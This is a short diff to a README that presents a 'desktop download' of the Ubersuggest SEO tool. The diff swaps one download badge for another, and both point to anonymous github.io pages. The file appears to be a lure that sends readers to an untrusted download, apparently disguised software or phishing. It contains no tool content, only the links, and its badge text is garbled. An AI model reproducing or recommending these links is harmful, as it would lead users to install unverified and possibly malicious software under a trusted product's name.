@@ -1,11 +1,7 @@
 # Ubersuggest Download — Desktop SEO and Keyword Research Tool
 
-<a href="https://git-app-desktop.github.io/.github/?offer=Ubersuggest" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Get%20Ubersuggest%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Get Ubersuggest GitHub">
-</a>
+[![GET Ubersuggest Ceo](https://img.shields.io/badge/GET%20%E2%80%94%20Ubersuggest-Ceo-0078D6?style=for-the-badge&logoColor=white)](https://f35909960.github.io/.github/Ubersuggest-Ceo)
+
 
 ---
 
